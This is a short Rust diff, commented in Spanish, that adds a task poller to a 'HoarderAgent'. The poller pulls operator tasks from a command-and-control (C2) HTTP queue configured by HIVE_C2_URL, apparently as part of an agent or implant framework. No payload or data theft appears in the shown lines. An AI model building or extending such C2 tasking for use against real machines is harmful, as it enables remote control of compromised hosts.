@@ -32,6 +32,9 @@ struct HoarderAgent {
 impl HoarderAgent {
     async fn new() -> Self {
         let identity = AgentIdentity::new();
+        // TaskPoller (ronda 4): cierra el ciclo operador → agente → resultado
+        // vía la cola HTTP del C2 (HIVE_C2_URL). Sin C2 configurado, no arranca.
+        let _ = hive_base::task_poller::spawn_from_env(identity.id(), "honeybee");
         let comms = HiveChamber::connect(&identity, Role::Honeybee)
             .await
             .expect("Failed to connect to colmena arena");
